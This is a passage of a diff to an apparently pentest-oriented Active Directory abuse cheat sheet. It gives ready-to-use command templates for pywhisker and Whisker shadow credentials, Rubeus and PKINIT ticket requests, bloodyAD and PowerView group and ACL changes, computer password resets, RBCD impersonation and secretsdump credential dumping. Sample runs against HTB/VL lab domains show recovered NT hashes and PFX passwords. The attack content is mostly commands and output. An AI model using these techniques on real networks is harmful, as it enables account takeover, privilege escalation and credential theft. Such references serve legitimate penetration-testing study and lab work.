+[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
+[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
+[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+python3 pywhisker.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
+```
+
+```console {class="sample-code"}
+$ python3 pywhisker.py -d haze.htb -u 'haze-it-backup$' -p 'Password123!' -k --dc-ip 10.129.232.50 --action add -t 'edward.martin' --use-ldaps
+[*] Searching for the target account
+[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
+[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
+[+] PFX exportiert nach: WYwZ8GQT.pfx
+[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
+[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
+[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+python3 pywhisker.py -d <DOMAIN> -u '<USER>' -H '<HASH>' -k --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
+```
+
+```console {class="sample-code"}
+$ python3 pywhisker.py -d haze.htb -u 'haze-it-backup$' -H '735c02c6b2dc54c3c8c6891f55279ebc' -k --dc-ip 10.129.232.50 --action add -t 'edward.martin' --use-ldaps
+[*] Searching for the target account
+[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
+[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
+[+] PFX exportiert nach: WYwZ8GQT.pfx
+[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
+[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
+[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+python3 pywhisker.py -d <DOMAIN> -u '<USER>' -k --dc-ip <DC_IP> --action add -t '<TARGET_USER>' --use-ldaps
+```
+
+```console {class="sample-code"}
+$ python3 pywhisker.py -d haze.htb -u 'haze-it-backup$' -k --dc-ip 10.129.232.50 --action add -t 'edward.martin' --use-ldaps
+[*] Searching for the target account
+[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: b5a6cbe1-20dd-ef0c-7231-ca295fb7a044
+[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: WYwZ8GQT.pfx
+[+] PFX exportiert nach: WYwZ8GQT.pfx
+[i] Passwort für PFX: k9Z5Q2g87lakxIoE7rd2
+[+] Saved PFX (#PKCS12) certificate & key at path: WYwZ8GQT.pfx
+[*] Must be used with password: k9Z5Q2g87lakxIoE7rd2
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
+
+#### 2. Request a Ticket Using the PFX
+
+```console
+python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<GENERATED_PASSWORD>' '<DOMAIN>/<TARGET_USER>' '<TARGET_USER>.ccache' -dc-ip <DC>
+```
+
+```console {class="sample-code"}
+$ python3 gettgtpkinit.py -cert-pfx WYwZ8GQT.pfx -pfx-pass 'k9Z5Q2g87lakxIoE7rd2' 'haze.htb/edward.martin' 'edward.martin.ccache' -dc-ip dc01.haze.htb 
+2025-10-31 20:24:22,412 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-10-31 20:24:22,420 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2025-10-31 20:24:36,391 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2025-10-31 20:24:36,391 minikerberos INFO     62414608995ff5382ef6657aad37038beaa512c8e65de94f3302f1771738acd5
+INFO:minikerberos:62414608995ff5382ef6657aad37038beaa512c8e65de94f3302f1771738acd5
+2025-10-31 20:24:36,393 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+```
+
+#### 3. Get NTLM Hash
+
+```console
+# Pass-the-ticket
+export KRB5CCNAME=<TARGET_USER>.ccache
+```
+
+```console
+# Get NTLM hash
+python3 getnthash.py '<DOMAIN>/<TARGET_USER>' -key <AS_REP_ENC_KEY>
+```
+
+```console {class="sample-code"}
+$ python3 getnthash.py 'haze.htb/edward.martin' -key 62414608995ff5382ef6657aad37038beaa512c8e65de94f3302f1771738acd5
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Using TGT from cache
+[*] Requesting ticket to self with PAC
+Recovered NT Hash
+09e0b3eeb2e7a6b0d419e9ff8f4d91af
+```
+
+<small>*Ref: [pywhisker](https://github.com/ShutdownRepo/pywhisker)*</small>
+<br>
+<small>*Ref: [PKINITtools](https://github.com/dirkjanm/PKINITtools)*</small>
+
+{{< /tabcontent >}}
+{{< /tabcontent >}}
+{{< tabcontent set4 tab2 >}}
+{{< tab set4-2 tab1 active>}}whisker{{< /tab >}}
+{{< tabcontent set4-2 tab1 >}}
+
+#### 1. Add Shadow Credentials
+
+```console
+.\whisker.exe add /domain:<DOMAIN> /target:'<TARGET_USER>' /dc:<DC> /password:'<PFX_PASSWORD>'
+```
+
+```console {class="sample-code"}
+PS C:\programdata> .\whisker.exe add /domain:outdated.htb /target:'sflowers' /dc:10.10.11.175 /password:'Password123!'
+[*] No path was provided. The certificate will be printed as a Base64 blob
+[*] Searching for the target account
+[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID 06a332a6-1ef1-4e73-bb9b-f5e5d1f9e963
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] You can now run Rubeus with the following syntax:
+
+Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAz .---[SNIP]--- TvhwICB9A= /password:"Password123!" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
+```
+
+#### 2. Request a Ticket Using the PFX File and Get NTLM Hash
+
+```console
+.\rubeus.exe asktgt /user:'<TARGET_USER>' /certificate:'<BASE64_PFX>' /password:'<PFX_PASSWORD>' /domain:<DOMAIN> /dc:<DC> /getcredentials /show
+```
+
+```console {class="sample-code"}
+PS C:\programdata> .\Rubeus.exe asktgt /user:sflowers /certificate:'MIIJuAIBAz .---[SNIP]--- TvhwICB9A=' /password:"Password123!" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0 
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
+[*] Using domain controller: 10.10.11.175:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIF0jCCBc ---[SNIP]--- F0ZWQuaHRi
+
+  ServiceName              :  krbtgt/outdated.htb
+  ServiceRealm             :  OUTDATED.HTB
+  UserName                 :  sflowers
+  UserRealm                :  OUTDATED.HTB
+  StartTime                :  9/22/2024 10:57:36 AM
+  EndTime                  :  9/22/2024 8:57:36 PM
+  RenewTill                :  9/29/2024 10:57:36 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  vqosgxeFibuRzlIPfnejKQ==
+  ASREP (key)              :  1E1FB4543905764478F7F129026B67A6
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
+```
+
+<small>*Ref: [Whisker.exe](https://github.com/eladshamir/Whisker)*</small>
+
+{{< /tabcontent >}}
 {{< /tabcontent >}}
 
 ---
 
-### Abuse #4 : Add Self to Group (From Linux)
+### Add Self to Group
 
-{{< tab set4 tab1 >}}bloodyAD{{< /tab >}}
-{{< tab set4 tab2 >}}powerview.py{{< /tab >}}
-{{< tabcontent set4 tab1 >}}
+{{< tab set5 tab1 >}}Linux{{< /tab >}}
+{{< tab set5 tab2 >}}Windows{{< /tab >}}
+{{< tabcontent set5 tab1 >}}
+{{< tab set5-1 tab1 active >}}bloodyAD{{< /tab >}}{{< tab set5-1 tab2 >}}powerview.py{{< /tab >}}
+{{< tabcontent set5-1 tab1 >}}
 
-#### 1. Add Self to Group
-
-```console
+```console {class="password"}
 # Password
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
-```console {class="sample-code"}
-$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend'
-[+] oorend added to SERVICEMGMT
+```console {class="ntlm"}
+# NTLM
+bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
-```console
-# Kerberos
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
-```console {class="sample-code"}
-$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add groupMember 'NETWORK AUDIT' 'm.lovegod'
-[+] m.lovegod added to NETWORK AUDIT
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+ bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
-#### 2. Add GenericAll over Target Group
-
-```console
-# Password
-bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
-
-```console {class="sample-code"}
-$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
-[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
-```
-
-```console
-# Kerberos
-bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
-```
-
-```console {class="sample-code"}
-$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add genericAll 'NETWORK AUDIT' 'm.lovegod' 
-[+] m.lovegod has now GenericAll on NETWORK AUDIT
-```
-
-<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>
 
 {{< /tabcontent >}}
-{{< tabcontent set4 tab2 >}}
+{{< tabcontent set5-1 tab2 >}}
 
 #### 1. Connect
 
-```console
-sudo ntpdate -s <DC_IP> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
+```console {class="password"}
+# Password
+powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
 ```
 
 ```console {class="sample-code"}
-$ sudo ntpdate -s dc01.rebound.htb && powerview 'rebound.htb/oorend:1GR8t@$$4u@dc01.rebound.htb'
-Logging directory is set to /home/kali/.powerview/logs/dc01.rebound.htb
-[2024-09-24 07:11:06] Channel binding is enforced!
-(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
-PV > 
+$ powerview 'haze.htb/haze-it-backup$:Password123!@DC01.haze.htb'
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
+```
+
+```console {class="ntlm"}
+# NTLM
+powerview '<DOMAIN>/<USER>@<TARGET>' -H '<HASH>'
+```
+
+```console {class="sample-code"}
+$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -H '735c02c6b2dc54c3c8c6891f55279ebc'
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -k
+```
+
+```console {class="sample-code"}
+$ powerview 'haze.htb/haze-it-backup$:Password123!@DC01.haze.htb' -k
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+powerview '<DOMAIN>/<USER>@<TARGET>' -H '<HASH>' -k
+```
+
+```console {class="sample-code"}
+$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -H '735c02c6b2dc54c3c8c6891f55279ebc' -k
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+powerview '<DOMAIN>/<USER>@<TARGET>' -k
+```
+
+```console {class="sample-code"}
+$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -k --no-pass
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
 ```
 
 #### 2. Add Self to Group
@@ -348,76 +804,21 @@ Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
 ```
 
 ```console {class="sample-code"}
-PV > Add-DomainGroupMember -Identity 'servicemgmt' -Members 'oorend'
-[2024-09-24 07:13:17] User oorend successfully added to servicemgmt
-```
-
-#### 3. Check
-
-```console
-Get-DomainGroupMember -Identity '<GROUP>'
-```
-
-```console {class="sample-code"}
-PV > Get-DomainGroupMember -Identity 'servicemgmt'
-GroupDomainName             : ServiceMgmt
-GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
-MemberDomain                : rebound.htb
-MemberName                  : ppaul
-MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
-MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951
-
----[SNIP]---
-
-GroupDomainName             : ServiceMgmt
-GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
-MemberDomain                : rebound.htb
-MemberName                  : oorend
-MemberDistinguishedName     : CN=oorend,CN=Users,DC=rebound,DC=htb
-MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
-```
-
-#### 4. Add Fullcontrol over Target Group
-
-```console
-# Exit and login to apply changes
-Add-DomainObjectAcl -TargetIdentity '<TARGET_GROUP>' -PrincipalIdentity '<USER>' -Rights fullcontrol
-```
-
-```console {class="sample-code"}
-PV > Add-DomainObjectAcl -TargetIdentity 'service users' -PrincipalIdentity 'oorend' -Rights fullcontrol
-[2024-09-24 07:37:24] [Add-DomainObjectACL] Found target identity: OU=Service Users,DC=rebound,DC=htb
-[2024-09-24 07:37:24] [Add-DomainObjectACL] Found principal identity: CN=oorend,CN=Users,DC=rebound,DC=htb
-[2024-09-24 07:37:24] Adding FullControl to OU=Service Users,DC=rebound,DC=htb
-[2024-09-24 07:37:24] DACL modified successfully!
-```
-
-#### 5. Check
-
-```console
-Get-DomainObjectAcl -Identity '<TARGET_USER>' -Where 'SecurityIdentifier contains <USER>'
-```
-
-```console {class="sample-code"}
-PV > Get-DomainObjectAcl -Identity 'winrm_svc' -Where 'SecurityIdentifier contains oorend'
-ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
-ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7684
-ACEType                     : ACCESS_ALLOWED_ACE
-ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
-ActiveDirectoryRights       : FullControl
-AccessMask                  : 0xf01ff
-InheritanceType             : None
-SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ Add-DomainObjectAcl -TargetIdentity 'SUPPORT_SERVICES' -PrincipalIdentity 'haze-it-backup$' -Rights fullcontrol
+[2025-10-31 22:23:23] [Add-DomainObjectACL] Found target identity: CN=Support_Services,CN=Users,DC=haze,DC=htb
+[2025-10-31 22:23:23] [Add-DomainObjectACL] Found principal identity: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
+[2025-10-31 22:23:23] Adding FullControl to S-1-5-21-323145914-28650650-2368316563-1112
+[2025-10-31 22:23:23] [Add-DomainObjectACL] Success! Added ACL to CN=Support_Services,CN=Users,DC=haze,DC=htb
 ```
 
 <small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>
 
 {{< /tabcontent >}}
-
-### Abuse #4 : Add Self to Group (From Windows)
-
-{{< tab set5 tab1 >}}Windows{{< /tab >}}
-{{< tabcontent set5 tab1 >}}
+{{< /tabcontent >}}
+{{< tabcontent set5 tab2 >}}
+{{< tab set5-2 tab1 active >}}powershell{{< /tab >}}
+{{< tabcontent set5-2 tab1 >}}
 
 #### 1. Import PowerView
 
@@ -425,145 +826,175 @@ SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-
 . .\PowerView.ps1
 ```
 
-```console {class=sample-code}
-*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
+```console {class="sample-code"}
+evil-winrm-py PS C:\programdata> . .\PowerView.ps1
 ```
 
-#### 2. Create a Cred Object (runas) \[Optional\]
+#### 2. Add Self to the Group
 
 ```console
-$username = '<DOMAIN>\<USER>'
-```
-
-```console
-$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
-```
-
-```console
-$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
-```
-
-#### 3. Add Self to Group
-
-```console
-Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $Cred
+Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
 ```
 
 ```console {class="sample-code"}
-PS C:\programdata> Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
-Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
+evil-winrm-py PS C:\programdata> Add-DomainGroupMember -Identity 'SUPPORT_SERVICES' -Members 'haze-it-backup$'
 ```
 
 #### 4. Check
 
 ```console
-Get-DomainGroupMember -Identity '<GROUP>'
+Get-DomainGroupMember -Identity '<GROUP>' -Domain <DOMAIN> -DomainController <DC> | fl MemberName
 ```
 
 ```console {class="sample-code"}
-PS C:\programdata> Get-DomainGroupMember -Identity 'security engineers'
-Get-DomainGroupMember -Identity 'security engineers'
+evil-winrm-py PS C:\programdata> Get-DomainGroupMember -Identity 'SUPPORT_SERVICES' -Domain haze.htb -DomainController dc01.haze.htb | fl MemberName
 
----[SNIP]---
-
-GroupDomain             : corp.local
-GroupName               : Security Engineers
-GroupDistinguishedName  : CN=Security Engineers,CN=Users,DC=corp,DC=local
-MemberDomain            : corp.local
-MemberName              : user
-MemberDistinguishedName : CN=user,OU=Contractors,OU=Corp,DC=corp,DC=local
-MemberObjectClass       : user
-MemberSID               : S-1-5-21-2291914956-3290296217-2402366952-1114
+MemberName : Haze-IT-Backup$
 ```
 
+{{< /tabcontent >}}
 {{< /tabcontent >}}
 
 ---
 
-### Abuse #5 : Change Password (GenericWrite over Computer)
+### Change Password (GenericWrite over Computer)
 
 {{< tab set6 tab1 >}}Linux{{< /tab >}}
 {{< tabcontent set6 tab1 >}}
 
-#### 1. Request a TGT
-
-```console
-sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+```console {class="password"}
+# Password
+impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -computer-name '<TARGET_COMPUTER>' -computer-pass '<NEW_PASSWORD>' -no-add
 ```
 
 ```console {class="sample-code"}
-$ sudo ntpdate -s 10.129.253.91 && impacket-getTGT 'retro2.vl/FS01$:fs01' -dc-ip 10.129.253.91                                    
+$ impacket-addcomputer 'retro2.vl/FS02$:fs02' -dc-ip 10.129.31.219 -computer-name 'ADMWS01$' -computer-pass 'Password123!' -no-add
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Saving ticket in FS01$.ccache
+[*] Successfully set password of ADMWS01$ to Password123!.
 ```
 
-```console
-export KRB5CCNAME='<USER>.ccache'
+```console {class="ntlm"}
+# NTLM
+impacket-addcomputer '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -computer-name '<TARGET_COMPUTER>' -computer-pass '<NEW_PASSWORD>' -no-add
 ```
 
 ```console {class="sample-code"}
-┌──(kali㉿kali)-[~/Desktop/RetroTwo]
-└─$ export KRB5CCNAME='FS01$.ccache'
+$ impacket-addcomputer 'retro2.vl/FS02$' -hashes :EB354224F433CD7CD824B1FDCE8C0795 -dc-ip 10.129.31.219 -computer-name 'ADMWS01$' -computer-pass 'Password123!' -no-add
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully set password of ADMWS01$ to Password123!.
 ```
 
-#### 2. Change Target Machine Password
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-host '<DC>' -dc-ip <DC_IP> -computer-name '<TARGET_COMPUTER>' -computer-pass '<NEW_PASSWORD>' -no-add
+```
 
-```console
+```console {class="sample-code"}
+$ impacket-addcomputer 'retro2.vl/FS02$:fs02' -k -dc-host 'BLN01.retro2.vl' -dc-ip 10.129.31.219 -computer-name 'ADMWS01$' -computer-pass 'Password123!' -no-add
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully set password of ADMWS01$ to Password123!.
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+impacket-addcomputer '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-host '<DC>' -dc-ip <DC_IP> -computer-name '<TARGET_COMPUTER>' -computer-pass '<NEW_PASSWORD>' -no-add
+```
+
+```console {class="sample-code"}
+$ impacket-addcomputer 'retro2.vl/FS02$' -hashes :EB354224F433CD7CD824B1FDCE8C0795 -k -dc-host 'BLN01.retro2.vl' -dc-ip 10.129.31.219 -computer-name 'ADMWS01$' -computer-pass 'Password123!' -no-add
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully set password of ADMWS01$ to Password123!.
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
 impacket-addcomputer '<DOMAIN>/<USER>' -k -no-pass -dc-host '<DC>' -dc-ip <DC_IP> -computer-name '<TARGET_COMPUTER>' -computer-pass '<NEW_PASSWORD>' -no-add
 ```
 
 ```console {class="sample-code"}
-┌──(kali㉿kali)-[~/Desktop/RetroTwo]
-└─$ impacket-addcomputer 'retro2.vl/FS01$' -k -no-pass -dc-host 'BLN01.retro2.vl' -dc-ip 10.129.253.91 -computer-name 'ADMWS01$' -computer-pass 'Test1234' -no-add
+$ impacket-addcomputer 'retro2.vl/FS02$' -k -no-pass -dc-host 'BLN01.retro2.vl' -dc-ip 10.129.31.219 -computer-name 'ADMWS01$' -computer-pass 'Password123!' -no-add
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Successfully set password of ADMWS01$ to Test1234.
+[*] Successfully set password of ADMWS01$ to Password123!.
 ```
 
 {{< /tabcontent >}}
 
 ---
 
-### Abuse #6 : RBCD Attack (GenericWrite over DC)
+### RBCD Attack (GenericWrite over DC)
 
 {{< tab set7 tab1 >}}Linux{{< /tab >}}
 {{< tabcontent set7 tab1 >}}
 
 #### 1. RBCD Attack
 
-```console
+```console {class="password"}
 # Password
-impacket-rbcd -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
+impacket-rbcd '<DOMAIN>/<USER>:<PASSWORD>' -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action 'write'
 ```
 
-```console
+```console {class="ntlm"}
 # NTLM
-impacket-rbcd -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action 'write' -hashes ':<HASH>' '<DOMAIN>/<USER>'
+impacket-rbcd '<DOMAIN>/<USER>' -hashes ':<HASH>' -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action 'write'
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+impacket-rbcd '<DOMAIN>/<USER>:<PASSWORD>' -k -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action 'write'
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+impacket-rbcd '<DOMAIN>/<USER>' -hashes ':<HASH>' -k -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action 'write'
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+impacket-rbcd '<DOMAIN>/<USER>' -k -no-pass -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action 'write'
 ```
 
 #### 2. Impersonate
 
-```console
+```console {class="password"}
 # Password
-impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate <TARGET_USER> -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
+sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
 ```
 
-```console
+```console {class="ntlm"}
 # NTLM
-impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate <TARGET_USER> -dc-ip <DC_IP> -hashes ':<HASH>' '<DOMAIN>/<USER>'
+sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
 ```
 
-#### 3. Import Ticket
-
-```console
-export KRB5CCNAME='<USER>@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache'
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
 ```
 
-#### 4. DCSync Attack
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>' -k -no-pass -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
+```
+
+#### 3. Secrets Dump
 
 ```console
-impacket-secretsdump '<USER>@<TARGET_DOMAIN>' -k -no-pass
+# Pass-the-ticket
+export KRB5CCNAME='<CCACHE>'
+```
+
+```console
+# Ticket-based Kerberos
+impacket-secretsdump '<USER>@<TARGET>' -k -no-pass
 ```
 
 {{< /tabcontent >}}
